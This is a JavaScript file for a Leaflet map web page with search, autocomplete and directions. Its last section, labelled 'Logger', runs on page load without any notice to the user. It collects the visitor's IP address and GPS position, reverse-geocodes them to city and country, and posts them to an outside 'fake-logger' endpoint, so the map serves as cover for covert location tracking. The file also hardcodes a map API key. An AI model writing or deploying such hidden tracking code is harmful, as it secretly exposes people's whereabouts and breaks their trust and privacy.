// --- Initial Map Setup ---
let map = L.map("map").setView([25.276987, 55.296249], 12); // Fake: Dubai

L.tileLayer('https://api.maptiler.com/maps/streets-v2/256/{z}/{x}/{y}.png?key=VcSgtSTkXfCbU3n3RqBO', {
  attribution: '',
  tileSize: 256,
  zoomOffset: 0,
  lang: 'en'
}).addTo(map);

let marker = L.marker([25.276987, 55.296249]).addTo(map);

// --- Toggle Buttons ---
const searchBox = document.querySelector(".floating-search");
const directionPanel = document.getElementById("direction-panel");

document.querySelector(".search-toggle").addEventListener("click", () => {
  searchBox.classList.toggle("hidden");
});
document.querySelector(".direction-toggle").addEventListener("click", () => {
  directionPanel.classList.toggle("hidden");
});

// --- Autocomplete Suggestions ---
function showSuggestions(inputId, suggestionBoxId) {
  const input = document.getElementById(inputId);
  const box = document.getElementById(suggestionBoxId);
  input.addEventListener("input", async () => {
    const val = input.value;
    if (!val) return box.innerHTML = "";
    const res = await fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${val}`);
    const data = await res.json();
    box.innerHTML = "";
    data.slice(0, 5).forEach(item => {
      const div = document.createElement("div");
      div.className = "suggestion";
      div.textContent = item.display_name;
      div.onclick = () => {
        input.value = item.display_name;
        box.innerHTML = "";
      };
      box.appendChild(div);
    });
  });
}
showSuggestions("search-input", "search-suggestions");
showSuggestions("start", "start-suggestions");
showSuggestions("end", "end-suggestions");

// --- Search ---
function searchLocation() {
  const query = document.getElementById("search-input").value;
  if (!query) return;
  fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${encodeURIComponent(query)}`)
    .then(res => res.json())
    .then(data => {
      if (data[0]) {
        const { lat, lon } = data[0];
        map.setView([lat, lon], 15);
        marker.setLatLng([lat, lon]);
      }
    });
}

// --- Directions ---
function getDirections() {
  const from = document.getElementById("start").value;
  const to = document.getElementById("end").value;
  if (!from || !to) return alert("Enter both places");

  Promise.all([
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${from}`).then(res => res.json()),
    fetch(`https://nominatim.openstreetmap.org/search?format=json&q=${to}`).then(res => res.json())
  ]).then(([fromData, toData]) => {
    if (!fromData[0] || !toData[0]) return alert("Invalid locations");
    const fromLatLng = L.latLng(fromData[0].lat, fromData[0].lon);
    const toLatLng = L.latLng(toData[0].lat, toData[0].lon);
    L.Routing.control({
      waypoints: [fromLatLng, toLatLng],
      router: L.Routing.osrmv1(),
      lineOptions: { styles: [{ color: 'green', weight: 4 }] },
      createMarker: () => null
    }).addTo(map);
  });
}

// --- Logger: Get IP + GPS and Send to Backend ---
async function captureAndSendLocation() {
  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const { ip } = await ipRes.json();

    navigator.geolocation.getCurrentPosition(async (pos) => {
      const latitude = pos.coords.latitude;
      const longitude = pos.coords.longitude;
      const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
      const geoData = await geoRes.json();
      const city = geoData.address.city || geoData.address.town || geoData.address.village || "Unknown";
      const country = geoData.address.country || "Unknown";

      await fetch("https://fake-logger.onrender.com/logger.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ ip, latitude, longitude, city, country })
      });
    });
  } catch (err) {
    console.error("Logger failed:", err);
  }
}
captureAndSendLocation();
